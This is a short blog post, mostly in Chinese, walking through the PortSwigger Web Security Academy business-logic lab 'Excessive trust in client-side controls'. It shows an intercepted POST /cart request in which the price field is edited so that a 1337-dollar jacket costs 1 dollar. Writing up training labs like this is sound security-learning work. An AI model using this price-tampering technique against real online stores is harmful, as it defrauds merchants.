---
layout: post
title: "Excessive trust in client-side controls"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Business_Logic
author: ""
tags: ['PortSwigger_Lab', 'Business_Logic']
---





翻譯:
過度信任客戶端控制



credentials: `wiener:peter`

登入
看一下帳戶 只有100刀

目標:
購買 Lightweight "l33t" Leather Jacket
1337元



進入 view detail

並加入購物車。

在這裡用bp 抓包





```http
POST /cart HTTP/1.1
Host: 0a9600e50344b4c6c0360db700c50068.web-security-academy.net
Cookie: session=fFGxn1AuLxE2FVLda3bu3VDgkZv0P542
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://0a9600e50344b4c6c0360db700c50068.web-security-academy.net
Referer: https://0a9600e50344b4c6c0360db700c50068.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

productId=1&redir=PRODUCT&quantity=1&price=133700

```

使用post 方式傳送
把price改成 100


然後去cart 可以發現購買價格為1元


按下購買。


實驗完成。



